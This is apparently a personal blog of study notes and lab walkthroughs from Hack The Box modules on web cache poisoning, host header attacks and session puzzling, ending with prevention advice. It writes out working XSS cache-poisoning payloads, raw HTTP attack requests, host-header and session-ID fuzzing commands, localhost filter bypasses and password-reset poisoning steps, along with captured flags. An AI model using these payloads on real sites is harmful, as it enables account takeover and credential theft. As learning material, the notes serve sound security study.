---
title: Web Cache Poisoning
date: 2024-02-10 12:00:00 -0400
categories: [Web Security, HTB]
tags: [web security, labs, owasp]
---

# Web cache Poisoning
Web cache poisoning is not web cache deception, is not response splitting or request smuggling
web cache deception tricking caches into storing sensitive information so the attackers can access to it
web cache poisoning is serve payloads to users via cache responses
![[https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted Image 20231126235320.png]]

Cache keys: The unique identifier that the server wont cache (refresh based on that: only host + path)
![[https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted Image 20231126235920.png]]

"Everything that is not part of the cache key is part of the cache poisoning attack surface"

## How To find Web Cache poisoning

![[https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted Image 20231222183735.png]]

1. Identify unkeyed input: http header or cookie
2. Look up if I can done anything interested (use param miner)
3. Specify a random cache buster(a parameter to change its value every request): if I don't do this, i will receive the cache response and not the unkeyed inputs injected
4. Try to getting save in the cache

## Case studies:

### Trusting headers
![[https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted Image 20231222184202.png]]
Based on this no cache header, you may think that is safe, but not
Use X-Forwarded-Header to inject an unkeyed input
![[https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted Image 20231222184301.png]]
The parameter ?safe=1 us used to cache to this specific path and not to the main page

### Seizing the Cache

![[https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted Image 20231222184422.png]]
In this Age specifies the exact second that this response will expire to the cache, so in the exact second the cache expires we need to spam the request in order to cache our request.

### Selective Poisoning
![[https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted Image 20231222184614.png]]
This Vary: User-Agent Header is telling to the cache to add the user agent to the cache key, so this request will poisoning the cache for other people using the same browser.

## Web cache configuration

```bash
http {
  proxy_cache_path /cache levels=1:2 keys_zone=STATIC:10m inactive=24h max_size=1g;

  server {
    listen       80;

    location / {
      proxy_pass             http://172.17.0.1:80;
      proxy_buffering        on;
      proxy_cache            STATIC;
      proxy_cache_valid      2m;
      proxy_cache_key $scheme$proxy_host$uri$args;
      add_header X-Cache-Status $upstream_cache_status;
    }
  }
}
```

- `proxy_cache_path` sets general parameters of the cache like the storage location
- `proxy_pass` sets the location of the web server
- `proxy_buffering` enables caching
- `proxy_cache` sets the name of the cache (as defined in `proxy_cache_path`)
- `proxy_cache_valid` sets the time after which the cache expires
- `proxy_cache_key` defines the cache key
- `add_header` adds the `X-Cache-Status` header to responses to indicate whether the response was cached
Example of non-cached and cached requests:
![[https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted Image 20231223172148.png]]

## Identify Unkeyed Params

Use this headers to determine if the content served is a cached response or not, check the cache-control response header in the response, how many seconds the response remains refresh:
Cache-Control: no-cache
Pragma: no-cache (deprecated)

![[https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted Image 20231223173520.png]]
When we send a different value in language parameter, we can see that the response differs and we get a ceche miss, therebefore the language parameter has to be keyed.

Both the language parameter and content are **KEYED**
![[https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted Image 20231223183053.png]]

The ref parameter is unkeyed, now we need to find how this parameter influence in the response content (maybe reflected)
![[https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted Image 20231223183205.png]]

Payload XSS in Unkeyed Parameter

```js
"><script>var xhr=new XMLHttpRequest();xhr.open('GET','/admin.php?reveal_flag=1',true);xhr.withCredentials=true;xhr.send();</script>
```

```http
GET /index.php?language=de&ref=%22%3E%3Cscript%3Evar%20xhr%20=%20new%20XMLHttpRequest();xhr.open(%27GET%27,%20%27/admin.php?reveal_flag=1%27,%20true);xhr.withCredentials%20=%20true;xhr.send();%3C/script%3E HTTP/1.1
Host: webcache.htb
```

Payload XSS in Unkeyed Headers

```http
GET /index.php?language=de HTTP/1.1
Host: webcache.htb
X-Backend-Server: testserver.htb"></script><script>var xhr=new XMLHttpRequest();xhr.open('GET','/admin.php?reveal_flag=1',true);xhr.withCredentials=true;xhr.send();//
```

### Impact

XSS
Unkeyed cookies
```http
GET /index.php HTTP/1.1
Host: webcache.htb
Cookie: consent=1;
```
if this response is cached, all other users will that visit the website are server content as if they already consented, also if color=blue cookie is cached, all other uses will still get server the blue layout if they previously choosen another color.

DOS
```http
GET / HTTP/1.1
Host: webcache.htb:80
```
If normalization is applied (stripping the port), this request will translate to this

```http
HTTP/1.1 302 Found
Location: http://webcache.htb:80/index.php
```
So, if we change the host to webcache.htb:1337, all users will be redirected to this port and achieve DOS.

## Cache Busters

In real cases, we need a unique cache key that we only use, so we get server the poisoned response and no real users are affected
```http
GET /index.php?language=unusedvalue&ref="><script>alert(1)</script> HTTP/1.1
Host: webcache.htb
```

## Advanced Techniques

### Fat Get
Basically GET request with request body (any method can contain request body but not necessarily effect), but is the server is misconfigured we can pass the keyed parameters in the request to cache the server.

This means our first request poisoned the cache with our injected fat GET parameter, but the web cache correctly uses the GET parameter in the URL to determine the cache key.

```http
GET /index.php?language=de HTTP/1.1
Host: fatget.wcp.htb
Content-Length: 142

ref="><script>var xhr = new XMLHttpRequest();xhr.open('GET', '/admin.php?reveal_flag=1', true);xhr.withCredentials = true;xhr.send();</script>
```

![[https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted Image 20231223212926.png]]

### Parameter Cloaking

Payload with all ; URL encoded:

```bash
ref=a%22%3E%3Cscript%3Evar%20xhr%20=%20new%20XMLHttpRequest()%3Bxhr.open(%27GET%27,%20%27/admin.php?reveal_flag=1%27,%20true)%3Bxhr.withCredentials%20=%20true%3Bxhr.send()%3B%3C/script%3E
```
The web cache sees two GET parameters: `language` with the value `en` and `a` with the value `b;language=de`. On the other hand, Bottle sees three parameters: `language` with the value `en`, `a` with the value `b`, and `language` with the value `de`. Since Bottle prefers the last occurrence of each parameter, the value `de` overrides the value for the language parameter. Thus, Bottle serves the response containing the German text. Since the parameter `a` is unkeyed, the web cache stores this response for the cache key `language=en`.
```http
GET /?language=en&a=b;language=de HTTP/1.1
Host: cloak.wcp.htb
```

sent multiple parameters with ; (separator)
***a, b are unkeyed parameter (we need to use unkeyed to append keyed (language))
language, content and ref are keyed***

```http
GET /?language=de&a=b;ref=%22%3E%3Cscript%3Evar%20xhr%20=%20new%20XMLHttpRequest()%3bxhr.open(%27GET%27,%20%27/admin?reveal_flag=1%27,%20true)%3bxhr.withCredentials%20=%20true%3bxhr.send()%3b%3C/script%3E HTTP/1.1
Host: cloak.wcp.htb
```

### Exercise Web Cache 1 (GET FAT)

Parameter content and language are keyed 
![[https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted Image 20231224022217.png]]
This is a get fat exercise, so i need to send language parameter in the GET request body.
Since in the hint says the admin will accesses the URL /index.php?language=de, I need to only key this argument like this.
![[https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted Image 20231224022431.png]]

!Flag delivered:  HTB{6f4c51837d8148cb8dc66beb14003706} 
![[https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted Image 20231224022446.png]]

### Exercise Web Cache 2(Parameter Cloaking )

This is the original request, the hint says the admin will visit /?language=de, so we need to poison this parameter appending a=b;language=payload.

![[https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted Image 20231224024231.png]]

```bash
Payload:?language=de&a=b;language=%22%3E%3Cscript%3Evar%20xhr%20=%20new%20XMLHttpRequest()%3bxhr.open(%27GET%27,%20%27/admin?reveal_flag=1%27,%20true)%3bxhr.withCredentials%20=%20true%3bxhr.send()%3b%3C/script%3E
```
![[https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted Image 20231224024455.png]]
We see the payload reflected in the response (stored xss), so the server cached the response and a request to /?language=de will serve the payload to admin.

Flag delivered!: HTB{cac766b823bbd388727162d634fa7503}
![[https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted Image 20231224024145.png]]

# Host Header Attacks

Common web server configuration:
```bash
<VirtualHost *:80>
    DocumentRoot "/var/www/testapp"
    ServerName testapp.htb
</VirtualHost>

<VirtualHost *:80>
    DocumentRoot "/var/www/anotherdomain"
    ServerName anotherdomain.org
</VirtualHost>
```

### Override Headers

X-Forwarded-Host
X-HTTP-Host-Override
Forwarded
X-Host
X-Forwarded-Server
x-http-method-override: POST (overrides the method, check purge or head)
content-type: s4yhii (test for invalid header make unavailable a web or repo)
x-forwarded-scheme: http (make a content unavailable, combine with x-forwarded-host)

![[https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted Image 20240122173845.png]]

![[https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted Image 20240122174017.png]]


### Auth bypass via host header

- Change Host header to localhost to access admin areas
- Fuzz for different ipv4 ips.
```bash
for a in {1..255};do
    for b in {1..255};do
        echo "192.168.$a.$b" >> ips.txt
    done
done
```

```shell-session
ffuf -u http://IP:PORT/admin.php -w ips.txt -H 'Host: FUZZ' -fs 752
```

#### Exercise

![[https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted Image 20240121122456.png]]

![[https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted Image 20240121123223.png]]
![[https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted Image 20240121123236.png]]

### Password Reset Poisoning

Send a request with the email of the victim and a manipulated host header that points to a domain under our control.
The webapp uses the manipulated host header to construct the password reset link such that the link points to our domain. When the victim now clicks the password reset link, we will be able to see the request on our domain.

#### Exercise

Sending http request with an override host header like X-Forwarded-Host pointing to our controlled server and the email of the victim (admin account)
![[https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted Image 20240121125017.png]]
![[https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted Image 20240121125116.png]]
Use this url to change the admin password.

### Web cache poisoning
If you have web cache poison in a login.php endpoint, you can use override headers to point to a server u own and exfiltrate the creds, use GET parameter to posing the cache.
#### Exercice

First we enter a cache buster to test this attack, to send to the admin we will erase this cache buster, and we add X-Host header to override the host header in the response, this can lead to posing the action form and send the creds with us

**The admin accesses the URL http://admin.hostheaders.htb/login.php

![[https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted Image 20240121144553.png]]
Final POC Request to steal admin creds

![[https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted Image 20240121144812.png]]

### Exercice Bypass flawed validation

Bypassing blacklist filters for `localhost`:

- Decimal encoding: 2130706433
- Hex encoding: 0x7f000001
- Octal encoding: 0177.0000.0000.0001
- Zero: 0
- Short form: 127.1
- IPv6: ::1
- External domain that resolves to localhost: localtest.me

![[https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted Image 20240122033143.png]]


# Session Puzzling


Stateful: Set-Cookie: PHPSESSID=hvplcmsh88ja77r3dutanmn68u;
Stateless: Set-Cookie: auth_token=eyfefefJ.......

```php
<?php
require_once ('db.php');
session_start();

// login
if(check_password($_POST['username'], $_POST['password'])) {
	$_SESSION['user_id'] = get_user_id($username);
    header("Location: profile.php");
    die();
} else {
	echo "Unauthorized";
}

// logout
if(isset($_POST['logout'])) {
	$_SESSION['user_id'] = 0;
}

?>
```

user_id is set to zero when logging out, so if zero is a valid user id, for instance for the admin user, the user could access /profile.php and find that he is logged as admin user.

## Weak session IDs

```bash
#create wordlist with 4 characters
crunch 4 4 "abcdefghijklmnopqrstuvwxyz1234567890" -o wordlist.txt

#fuzz for weak session ids
ffuf -u http://127.0.0.1/profile.php -b 'sessionID=FUZZ' -w wordlist.txt -fc 302 -t 10
```

To analyze the entropy of session IDs, we can use `Burp Sequencer`. To do so, we right-click the login request in Burp and click on `Send to Sequencer`. Afterward, switch to the Sequencer Tab. Make sure that Burp automatically detected the session cookie in the `Token Location Within Response` field and that the `Cookie` option is selected. We could also specify a custom location if we wanted to analyze the entropy of a different field in the response. Afterward, start the live capture.

![[https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted Image 20240129045207.png]]

## Common Session Variables (Auth Bypass)

1ST takeaway: In multi step reset password flow, if the flow has 3 steps, omit the second step, usually verification (2fa, sms, etc) and reset the pass with the third step.

2ND takeaway:  enter `Forgot Password?` and enter the username `admin`. Afterward, access the post-login endpoint at `/profile.php` directly. We are now logged in as the admin user by exploiting our first session puzzling vulnerability. This happens because of this code
```php
<SNIP>

if(isset($_POST['Submit'])){
	$_SESSION['Username'] = $_POST['Username'];
	header("Location: reset_2.php");
	exit;
}

<SNIP>
```

```php
<SNIP>

if(!isset($_SESSION['Username'])){
    header("Location: login.php");
	exit;
  }

<SNIP>
```
See that the session variable username is set by forgot password flow and the auth code only checks if the variable is set.

#### Exercise 

Send a request with admin user in forgot password, remember the cookie
![[https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted Image 20240129055657.png]]

the user is set to admin in this session cookie, so we only need to visit profile.php with this cookie without authentication.

![[https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted Image 20240129055741.png]]

## Premature Session Population (Auth Bypass)

The login process sets the session variables that determine whether a user is authenticated or not before the result of the authentication is known, which is before the user's password is checked. The variables are only unset if the redirect to `/login.php?failed=1` is sent

```php
if(isset($_POST['Submit'])){
	$_SESSION['Username'] = $_POST['Username'];
	$_SESSION['Active'] = true;

	// check user credentials
	if(login($Username, $_POST['Password'])) {
	    header("Location: profile.php");
	    exit;

	} else {
	    header("Location: login.php?failed=1");
        exit;
    }
}
if (isset($_GET['failed'])) {
	session_destroy();
    session_start();
}
```

#### Exercise

Change failed= 1 with success=1
![[https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted Image 20240130060742.png]]
![[https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted Image 20240130082705.png]]

## Common Session Variables (Account Takeover)

This session puzzling vulnerability is the result of the re-use of the same session variable to store the phase of two different processes. If these processes are executed concurrently, it is possible to skip the security question of the password reset process, thus leading to account takeover.

Exercise:
primero ir a register colocar admin en register_1, luego ir a reset_1 colocar admin, seguir con register_2 y aceptar. Saltar a reset_3 y configurar la nueva password. Al ingresar piden MFA, por ello volveremos a register_1 para hacer register_1 y register_2, finalmente volveremos al MFA y entraremos a profile.php.

![[https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted Image 20240211073537.png]]

# Prevention

Never set sessionid by default to 0, when log out for example.
```php
// login
if(check_password($_POST['username'], $_POST['password'])) {
	$_SESSION['user_id'] = get_user_id($username);
    header("Location: profile.php");
    die();
} else {
	echo "Unauthorized";
}

// logout
if(isset($_POST['logout'])) {
	$_SESSION['user_id'] = 0;
}
```

Common Session Variables

never re-use session variables for different processes on the web application since it can be hard to keep track of how the different processes intertwine and may be combined to bypass certain checks. Additionally, a separate session variable should be used to keep track of whether a user is currently logged in. Following is a simple improved example:

```php
if(isset($_POST['Submit'])){
    if(login($_POST['Username'], $_POST['Password'])) {
        $_SESSION['auth_username'] = $_POST['Username'];
        $_SESSION['is_logged_in'] = true;

        header("Location: profile.php");
        exit;
    } else {
        <SNIP>
    }
}
```

Premature population

 Due to the premature population of the session variables, the user is thus considered logged in by the web server before the password is checked. This can easily be prevented by ensuring that the session variables are not populated prematurely, but only after the login process has been completed:
 ```php
if(isset($_POST['Submit'])){
    $_SESSION['login_fail_user'] = $_POST['Username'];

    if(login($_POST['Username'], $_POST['Password'])) {
	    $_SESSION['auth_username'] = $_POST['Username'];
	    $_SESSION['is_logged_in'] = true;
        header("Location: profile.php");
        exit;

    } else {
        header("Location: login.php?failed=1");
        exit;
    }
}
if (isset($_GET['failed'])) {
    echo "Login failed for user " . $_SESSION['login_fail_user'];
    session_start();
	session_unset()
	session_destroy();
}
```
- Completely unset session variables instead of setting a default value at re-initialization
- Use a single session variable only for a single, dedicated purpose
- Only populate a session variable if all prerequisites are fulfilled and the corresponding process is complete



# Skill Assessment

## Easy

Login with you normal creds
![[https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted Image 20240211075912.png]]

You cant access admin area
![[https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted Image 20240211075940.png]]

In order to populate the username variable we use reset password function
![[https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted Image 20240211080024.png]]
After clic in submit the flag appears
![[https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted Image 20240211080105.png]]

## Hard

After loggin with normal creds we see this message
![[https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted Image 20240211080641.png]]
so we now have a clue where to poison the cache, we see the parameters sort_by and utm_source, sort_by is unkeyed, so we use this via parameter cloacking to poison the cache, also we verifiy where is injected our payload to make the correct one

```http
/admin/users.html?sort_by=role&utm_source=users.html;sort_by=")</script><script>var+xhr+%3d+new+XMLHttpRequest()%3bxhr.open('GET',+'/admin/promote%3fuid%3d2',+true),xhr.send()%3b</script>
```

![[https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted Image 20240211085553.png]]

Then for the other part, we need to exfiltrate the pin, we found the **Forwarded** Header is unkeyed and is reflected in response so we use this header to inject our interactsh.local url without the cache buster a=xd.and refresh=1

![[https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted Image 20240211085835.png]]

![[https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted Image 20240211090344.png]]

![[https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted Image 20240211090326.png]]![[https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted Image 20240211090354.png]]